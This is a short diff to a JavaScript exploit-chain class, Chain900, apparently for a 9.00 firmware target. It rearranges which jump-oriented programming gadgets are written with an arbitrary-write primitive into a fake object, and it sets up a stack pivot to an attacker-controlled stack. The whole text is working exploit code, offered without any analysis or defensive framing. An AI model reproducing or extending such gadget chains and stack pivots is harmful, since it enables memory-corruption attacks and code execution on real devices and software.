@@ -614,16 +614,11 @@ class Chain900 extends Chain900Base {
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
-        //rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        //rw.write64(rax_ptrs, 0x60, this.get_gadget(jop3));
-        //rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
-        //rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
-        //rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
-
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x60, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
         // value to pivot rsp to
         rw.write64(rax_ptrs, 0x18, this.stack_addr);
 
